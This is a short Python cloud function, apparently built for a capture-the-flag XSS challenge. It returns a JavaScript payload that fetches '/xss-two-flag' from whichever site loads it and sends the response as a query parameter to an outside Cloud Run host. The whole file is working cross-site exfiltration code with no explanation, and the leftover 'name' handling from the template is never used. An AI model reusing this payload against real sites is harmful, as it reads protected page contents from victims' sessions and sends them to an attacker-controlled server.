def serveIt(request):
    """HTTP Cloud Function.
    Args:
        request (flask.Request): The request object.
        <https://flask.palletsprojects.com/en/1.1.x/api/#incoming-request-data>
    Returns:
        The response text, or any set of values that can be turned into a
        Response object using `make_response`
        <https://flask.palletsprojects.com/en/1.1.x/api/#flask.make_response>.
    """
    request_json = request.get_json(silent=True)
    request_args = request.args

    if request_json and 'name' in request_json:
        name = request_json['name']
    elif request_args and 'name' in request_args:
        name = request_args['name']
    else:
        name = 'World'

    return """  
            var xhr = new XMLHttpRequest();
            xhr.open('GET',location.origin + '/xss-two-flag',true);
            xhr.onload = function () {
                var request = new XMLHttpRequest();
                request.open('GET','https://store-flag-808630243113.us-central1.run.app?flag=' + xhr.responseText,true);
                request.send()};
            xhr.send(null);
    """